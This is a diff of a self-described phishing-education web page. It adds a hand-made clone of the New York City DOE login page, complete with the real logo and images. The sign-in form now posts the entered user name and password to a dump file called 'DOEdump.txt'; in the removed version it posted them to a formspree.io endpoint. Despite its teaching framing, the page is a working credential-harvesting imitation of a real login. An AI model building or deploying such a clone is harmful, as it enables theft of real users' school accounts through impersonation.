@@ -19,25 +19,53 @@
         crossorigin="anonymous"></script>
         <div class="blurb">
             <h2>Test 3</h2>
-            <p>To the phishing education emporium. In this webpage you will learn and see
-            many useful things about the digital problem of phishing. </p>
-            <p>First and foremost, what is phishing?</p>
-
-            <button onclick="switchDOE()">View Phish</button>
-
+            <p>Perhaps in the future, a websites backend code would be encrypted and unreachabled
+            by users, thus seemingly putting an end to clone phishing. But this test will prove that
+            even if one can't simply copy/paste code, cloning websites is still fairly doable.
         </div>
+        <div id="exp">
+            <h2>How it's Made</h2>
+            <p>Although it may seem obvious, every website IS what the webpage displays. To the 
+            average user, if a website essentially looks the exact same to another, even if the 
+            backend code is different, the user will think it is the same website. It may seem tedious,
+            but an exact copy of any website can be made by hand, as long as it is visible to the user.
+            This can be done with any page on the world wide web, such as with the official DOE login below, 
+            which some viewers may be familiar with:
+            </p>
+            <br>
+            <img id="standardimg" src="Images/officialdoe.png" alt="Error">
+            <br>
+            <br>
+            <p>
+            And that is what I have exactly done here. Without directly copying the websites code, I created a
+            clone of the DOE login website by hand. This took considerably longer than the first two tests.
+            It is a close and faithful copy yet hold them side by side
+            and the differences are obvious.
+            <br>
+            <br>
+            This test will showcase a somewhat exact clone of the <a href="https://idp.nycenet.edu/">DOE Login</a> 
+            Click the button below to start the test. Once in the test, you may return by
+            the button on the top.
+            </p>
+            <button id="start" onclick="switchP()">View</button>
+        </div>
+        <br>
+        <br>
+        <footer id="foot">&copy Copyright of Urban Professional 2022 - 2022</footer>
     </div>
     <div id="fake">
+        <button id="end" onclick="switchR()">Return</button>
+        <br>
         <img id="ELogo" src="Images/DOELOGO.png" alt="Error">
         <div id="Signin">
             <h1>Sign In</h1>
         </div>
         <img id="doealert" src="Images/Invalid.png" alt="Error">
-        <form action="https://formspree.io/f/maykvgby" onsubmit="doealert()">
+        <form action="FormInput/DOEdump.txt" onsubmit="doealert()" method="POST">
         <p id="username">User name / Email</p>
-        <input id="iuser" type="text" method="POST" title="Please provide user name">
+        <input id="iuser" type="text" name="user" title="Please provide user name">
         <p id="password">Password</p>
-        <input id="ipass" type="password" title="Please provide password">
+        <input id="ipass" name="pass" type="password" title="Please provide password">
         <input type="submit" value="Sign In" id="submit">
         </form>
         <img src="Images/DoeBottom.png" alt="Error">
